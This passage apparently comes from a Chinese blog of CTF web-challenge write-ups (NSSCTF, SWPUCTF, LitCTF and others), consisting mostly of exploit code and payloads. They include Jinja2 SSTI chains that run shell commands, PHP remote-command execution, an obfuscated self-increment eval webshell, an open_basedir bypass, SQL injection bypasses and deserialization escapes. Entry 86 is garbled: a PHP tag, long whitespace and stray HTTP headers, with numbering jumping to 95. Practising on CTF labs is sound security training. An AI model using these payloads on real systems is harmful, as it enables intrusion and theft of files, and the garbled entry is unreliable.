<p><code>python3 flask_session_cookie_manager3.py encode -s &#39;LitCTF&#39; -t &#39;&#123;&quot;name&quot;:&quot;admin&quot;&#125;&#39; </code></p>
<h1 id="84-NISACTF-2022-is-secret"><a href="#84-NISACTF-2022-is-secret" class="headerlink" title="84.[NISACTF 2022]is secret"></a>84.[NISACTF 2022]is secret</h1><p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):<span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br><span class="line"><span class="comment">#输入内容：&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="85-NISACTF-2022-middlerce"><a href="#85-NISACTF-2022-middlerce" class="headerlink" title="85.[NISACTF 2022]middlerce"></a>85.[NISACTF 2022]middlerce</h1><p>PRCE回溯绕过限制；使用反引号执行命令，短标签执行php。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`tail /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27;</span> + <span class="string">&quot;$&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28713/&quot;</span>, data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h1 id="86-SWPUCTF-2022-新生赛-1z-unserialize"><a href="#86-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="86.[SWPUCTF 2022 新生赛]1z_unserialize"></a>86.[SWPUCTF 2022 新生赛]1z_unserialize</h1><p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>

<h1 id="95-SWPUCTF-2021-新生赛-hardrce-3"><a href="#95-SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="95.[SWPUCTF 2021 新生赛]hardrce_3"></a>95.[SWPUCTF 2021 新生赛]hardrce_3</h1><p>自增payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>不知道为什么写马写不进去，用这个直接读flag就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="96-SWPUCTF-2022-新生赛-js-sign"><a href="#96-SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="96.[SWPUCTF 2022 新生赛]js_sign"></a>96.[SWPUCTF 2022 新生赛]js_sign</h1><p>F12，敲击码<code>33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15</code>去除空格</p>
<p>反查解码</p>
<p><code>3343431344215434452124331421311122125444113513341415</code></p>
<p><code>NSSCTF&#123;youfindflagbytapcode&#125;</code></p>
<h1 id="97-HNCTF-2022-WEEK2-ez-SSTI"><a href="#97-HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="97.[HNCTF 2022 WEEK2]ez_SSTI"></a>97.[HNCTF 2022 WEEK2]ez_SSTI</h1><p>焚靖一把梭，flag就在当前目录下</p>
<h1 id="98-GDOUCTF-2023-反方向的钟"><a href="#98-GDOUCTF-2023-反方向的钟" class="headerlink" title="98.[GDOUCTF 2023]反方向的钟"></a>98.[GDOUCTF 2023]反方向的钟</h1><p>construct可以自己重写的</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster =<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后使用php原生类SplFileObject执行文件读取<code>a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="99-SWPUCTF-2022-新生赛-xff"><a href="#99-SWPUCTF-2022-新生赛-xff" class="headerlink" title="99.[SWPUCTF 2022 新生赛]xff"></a>99.[SWPUCTF 2022 新生赛]xff</h1><p>X-Forwarded-For: 127.0.0.1</p>
<p>Referer: index.php</p>
<h1 id="100-MoeCTF-2022-baby-file"><a href="#100-MoeCTF-2022-baby-file" class="headerlink" title="100.[MoeCTF 2022]baby_file"></a>100.[MoeCTF 2022]baby_file</h1><p>payload:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="101-CISCN-2019初赛-Love-Math"><a href="#101-CISCN-2019初赛-Love-Math" class="headerlink" title="101.[CISCN 2019初赛]Love Math"></a>101.[CISCN 2019初赛]Love Math</h1><p>二次传参rce</p>
<p>16进制只能构造到字母f，36进制可以构造所有的字母。</p>
<p>dechex：把10进制转换成16进制，_GET的16进制是<code>5F474554</code>，转换成10进制是<code>1598506324</code></p>
<p>base_convert(num,10,36)把10进制转换成36进制</p>
<p>16进制转换成字符串，需要hex2bin函数</p>
<p>使用base_convert构造出hex2bin，hex2bin作为36进制的数，转换为10进制是<code>37907361743</code></p>
<p><code>base_convert(37907361743,10,36)(dechex(1598506324))</code></p>
<p>得到的结果就是<code>_GET</code></p>
<p>使用变量pi来保存base_convert的结果，形式是$pi</p>
<p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p>
<p>编译一下，?c&#x3D;$pi&#x3D;_GET;</p>
<p>那么$$pi就是$_GET</p>
<p>$$pi{pi}就是$_GET{pi}也就是$_GET[pi]</p>
<p>那么<code>$$pi&#123;pi&#125;($$pi&#123;abs&#125;)</code>也就是最上面的<code>$_GET[1]($_GET&#123;2&#125;)</code>，1和2在本题会被过滤，使用合法的代号<code>pi</code>和<code>abs</code>，尽量选择短的，因为payload长度不能超过80</p>
<h1 id="102-NSSRound-8-Basic-MyDoor"><a href="#102-NSSRound-8-Basic-MyDoor" class="headerlink" title="102.[NSSRound#8 Basic]MyDoor"></a>102.[NSSRound#8 Basic]MyDoor</h1><p>文件读取flag.php失败，尝试读取index.php如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php的特性，N[S.S会解析成N_S.S</p>
<p>payload:<code>?N[S.S=phpinfo();&amp;file=1</code></p>
<h1 id="103-prize-p5"><a href="#103-prize-p5" class="headerlink" title="103.prize_p5"></a>103.prize_p5</h1><p>非预期：SplFileObject绕过waf，类大小写不敏感(改为大写S)</p>
<p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileOb\6Aect&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p><code>?cata=O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileOb\6Aect&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p>预期：序列化字符串逃逸</p>
<p><code>name=test&amp;phone[]=NSS&amp;email=test</code></p>
<p><code>O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:3:&quot;hacker&quot;;&#125;s:5:&quot;email&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>目标：<code>&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code>，一共28个字符，就需要使用hello触发waf的替换，hello变hacker，就可以多一个字符出来了，要28个hello</p>
<p><code>hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p><code>O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:168:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;&#125;s:5:&quot;email&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>payload:</p>
<p><code>?cata=1 POST name=test&amp;phone[]=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;email=test</code></p>
<h1 id="104-NCTF-2018-flask真香"><a href="#104-NCTF-2018-flask真香" class="headerlink" title="104.[NCTF 2018]flask真香"></a>104.[NCTF 2018]flask真香</h1><p>&#x2F;后面直接接的就是注入点，无需参数，fuzz存在以下黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class</span><br><span class="line">getattr</span><br><span class="line">builtins</span><br><span class="line">import</span><br><span class="line">os</span><br></pre></td></tr></table></figure>

<p>使用字符串拼接绕过，查询子类</p>
<p><code>&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcla''sses__']()&#125;&#125;</code>，得到大量子类</p>
<p>寻找warnings.catch_warnings子类的下标：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">classes=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[&lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;,  ...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">alllist=[]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i==<span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result+=i</span><br><span class="line"><span class="comment">#寻找要找的类，并返回其索引</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(alllist):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;warnings.catch_warnings&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment">#117---&gt; &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[117].__init__.__globals__['__buil''tins__']['ev''al']("__im""port__('o''s').po""pen('ls /').read()")&#125;&#125;</code></p>
<h1 id="105-LitCTF-2023-就当无事发生"><a href="#105-LitCTF-2023-就当无事发生" class="headerlink" title="105.[LitCTF 2023]就当无事发生"></a>105.[LitCTF 2023]就当无事发生</h1><p>进入出题人博客-&gt;关于我-&gt;github-&gt;进入ProbiusOfficial.github.io查找归档文件里的flag，但是现在已删除，只能在wp里找到</p>
<h1 id="106-SWPUCTF-2022-新生赛-ez-sql"><a href="#106-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="106.[SWPUCTF 2022 新生赛]ez_sql"></a>106.[SWPUCTF 2022 新生赛]ez_sql</h1><p>双写绕过，&#x2F;**&#x2F;绕过空格</p>
<p>POST：<code>nss=2&#39;/**/ununionion/**/select/**/1,database(),3;#</code></p>
<p>得到NSS_db，回显位在2和3，但后续注入要在3</p>
<p><code>nss=2&#39;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#39;NSS_db&#39;;#</code></p>
<p><code>nss=2&#39;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#39;NSS_tb&#39;;#</code></p>
<p><code>2&#39;/**/ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_tb;#</code></p>
<h1 id="107-HDCTF-2023-YamiYami"><a href="#107-HDCTF-2023-YamiYami" class="headerlink" title="107.[HDCTF 2023]YamiYami"></a>107.[HDCTF 2023]YamiYami</h1><p>非预期：file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ</p>
<p>预期：session伪造+yaml反序列化，当前目录在&#x2F;app，尝试读取&#x2F;app&#x2F;app.py，可以使用二次url编码绕过waf</p>
<p><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
<p>读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 